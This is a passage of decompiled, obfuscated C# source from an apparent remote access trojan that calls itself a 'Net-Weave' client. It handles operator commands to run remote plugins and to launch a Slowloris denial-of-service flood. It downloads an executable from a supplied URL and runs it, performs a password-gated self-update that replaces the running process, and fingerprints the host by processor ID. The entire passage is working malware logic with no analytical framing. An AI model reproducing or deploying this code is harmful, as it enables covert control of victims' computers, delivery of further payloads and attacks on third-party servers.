					for (int i = 0; i < GClass1.sortedList_1.Count; i++)
					{
						if (GClass1.sortedList_1.Keys[i] == guid && (int)GClass1.sortedList_1.Values[i].get_CurrentState() == 1)
						{
							GClass1.sortedList_1.Values[i].Stop(sender);
							break;
						}
					}
				}
				catch
				{
					@class.method_9("Failed to stop plugin");
				}
				break;
			case Class3.Enum0.const_13:
				bool_0 = true;
				break;
			case Class3.Enum0.const_17:
				@class.method_10(bool_2: true);
				break;
			default:
				@class.method_9("Broken\\Invalid Header");
				break;
			case Class3.Enum0.const_19:
				bool_1 = true;
				int_0 = BitConverter.ToInt32(e.Byte_0, 0);
				@class.method_10(bool_2: true);
				break;
			case Class3.Enum0.const_20:
				if (Class14.Boolean_0)
				{
					@class.method_9(Class14.String_0 + " Flood Already Active");
					return;
				}
				Class14.smethod_0(Class14.Enum3.const_3, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class14.smethod_1();
				@class.method_9("Slowloris Flood Active");
				break;
			}
			class2.Close();
		}
		catch
		{
		}
	}

	private static void smethod_9(object sender, EventArgs e)
	{
		Class3 @class = (Class3)sender;
		Class7 class2 = new Class7();
		class2.Write(Class9.smethod_1());
		class2.Write(Class6.smethod_0());
		class2.Write(Class8.string_7);
		class2.Write(Class0.smethod_3(@class.String_1, bool_0: true));
		class2.Write(Class8.string_11);
		byte[] data = class2.method_0();
		@class.method_7(new Class4(Class3.Enum0.const_15, data).method_0());
		@class.method_3();
		Class13.smethod_0(@class);
		class2 = null;
		data = null;
	}

	private static void smethod_10(object sender, EventArgs e)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Invalid comparison between Unknown and I4
		Class3 @class = (Class3)sender;
		Class13.smethod_1(@class);
		@class.method_11();
		if (bool_0)
		{
			Thread.Sleep(TimeSpan.FromSeconds(30.0));
			bool_0 = false;
		}
		else if (bool_1)
		{
			Thread.Sleep(TimeSpan.FromSeconds(int_0));
			int_0 = 0;
			bool_1 = false;
		}
		if (GClass1.sortedList_1.Count > 0)
		{
			foreach (IPlugin value in GClass1.sortedList_1.Values)
			{
				if ((int)value.get_CurrentState() == 1 && value.get_StopOnDisconnection())
				{
					value.Stop(sender);
				}
			}
		}
		@class.method_0();
	}

	private static void smethod_11(object sender, EventArgs2 e)
	{
	}

	private static void smethod_12(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class3).method_9(((IPlugin)((sender is IPlugin) ? sender : null)).get_Name() + ": Stopped");
			}
		}
		catch
		{
		}
	}

	private static void smethod_13(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class3).method_9(val.get_Name() + ": Started");
			}
		}
		catch
		{
		}
	}

	private static void smethod_14(IPlugin iplugin_0, PluginArgs pluginArgs_0)
	{
		try
		{
			pluginArgs_0.PluginGuid = iplugin_0.get_Guid();
			if (iplugin_0.get_StateObject() != null)
			{
				Class3 @class = iplugin_0.get_StateObject() as Class3;
				@class.method_7(new Class4(Class3.Enum0.const_12, Serializer.Serialize(pluginArgs_0)).method_0());
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("PLUGIN ERROR - Name: {0}, Error: {1}", iplugin_0.get_Name(), ex.Message);
			(iplugin_0.get_StateObject() as Class3).method_9(iplugin_0.get_Name() + ": Error");
		}
	}

	private static void smethod_15(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class3).method_9(val.get_Name() + ": Executed");
			}
		}
		catch
		{
		}
	}

	private static void smethod_16(object object_0)
	{
		object[] array = (object[])object_0;
		try
		{
			string fileName = Path.GetTempFileName() + ".exe";
			WebClient webClient = new WebClient();
			(array[1] as Class3).method_9("Downloading");
			webClient.DownloadFile((string)array[0], fileName);
			Process.Start(fileName);
			webClient.Dispose();
			(array[1] as Class3).method_9("File Executed");
		}
		catch
		{
			(array[1] as Class3).method_9("Error Downloading File.");
		}
	}

	private static void smethod_17(object object_0)
	{
		object[] array = (object[])object_0;
		if (array[1].ToString() != Encoding.Default.GetString(Class0.smethod_1(Convert.FromBase64String(Class8.string_10), bool_0: false)))
		{
			(array[2] as Class3).method_9("Invalid password");
			return;
		}
		try
		{
			string fileName = Path.GetTempFileName() + ".exe";
			WebClient webClient = new WebClient();
			(array[2] as Class3).method_9("Downloading");
			webClient.DownloadFile((string)array[0], fileName);
			(array[2] as Class3).method_9("Updating");
			if (Class8.bool_0)
			{
				Class12.smethod_4();
			}
			(array[2] as Class3).method_10(bool_2: false);
			Process.Start(fileName);
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
			(array[2] as Class3).method_9("Error Updating");
		}
	}

	private static void smethod_18()
	{
		new Thread(smethod_19).Start();
	}

	private static void smethod_19()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("A Net-Weave client is running on this PC.\nPress OK to close the client.", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
		Process.GetCurrentProcess().Kill();
	}

	private static string smethod_20()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementClass val = new ManagementClass("win32_processor");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (text == "")
					{
						text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
							.ToString();
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch
		{
		}
		return string.Empty;
	}

	private static string smethod_21(string string_1)
	{
		MD5 mD = MD5.Create();
		byte[] bytes = Encoding.ASCII.GetBytes(string_1);
		byte[] array = mD.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("X2"));
		}
		return stringBuilder.ToString();
	}
}
